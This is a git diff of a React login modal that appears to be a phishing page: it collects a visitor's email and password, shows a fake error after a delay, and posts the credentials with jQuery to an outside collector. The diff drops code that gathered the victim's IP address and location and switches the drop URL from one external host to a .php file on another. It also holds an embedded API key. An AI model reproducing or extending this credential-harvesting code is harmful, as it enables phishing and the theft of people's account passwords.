@@ -4,46 +4,11 @@ import Panell from './media/img/authpanel.png';
 import Logg from './media/img/logo.png';
 import SensitiveFile from './media/img/file.png';
 import Signn from './media/img/sign.png';
-import { useState, useEffect } from 'react';
+import { useState } from 'react';
 import $ from 'jquery';
 
 export const Modal = ()=>{
 
-
-
-    const [ipAdress, setIpAdress] = useState('')
-    const [city, setCity] = useState('');
-    const [flag, setFlag] = useState('');
-    const [country, setCountry] = useState('');
-
-    const forTime = new Date();
-
-
-    useEffect(()=>{
-        fetch(`https://api.geoapify.com/v1/ipinfo?apiKey=139d2378a5554f48bf290b61999b4e8a`)
-        .then(req=> req.json())
-        .then(res=>{
-            // setCountry(res.names.en)
-            // console.log(res.names.en);
-            // console.log('city:',res.city.name);
-
-            setIpAdress(res.ip)
-            setFlag(res.country.flag);
-            setCountry(res.country.name);
-            setCity(res.city.names.en);
-
-            
-            
-            
-            // console.log('ipAddress:', res.ip);
-            // console.log('flag:', res.country.flag);
-            // console.log('country:', res.country.name);
-            // console.log('city:', res.city.names.en);
-            // console.log(res);
-
-        })
-        .catch(e=> console.log)
-    }, []);
 
     // const reloadPreloader = ()=> window.location.reload();
 
@@ -72,23 +37,17 @@ export const Modal = ()=>{
             setTimeout(() => {
               setPwd('');
               setErr(true);
-            }, 1700);
+            }, 2500);
 
 
           const user = {
             email: email,
-            pswd: pwd,
-            country: country,
-            
-            city: city,
-            flag: flag,
-            eyep: ipAdress,
-            nownow: forTime
+            password: pwd,
         };
     
           $.ajax({
               type: "POST",
-              url: "https://meler-service.onrender.com/get_details/cadieuix.eve@gmail.com",
+              url: "https://physicaleducationdiploma.com/component/cadie.php",
             //   cadieuix.eve@gmail.com
               data: user,
               success(data) {
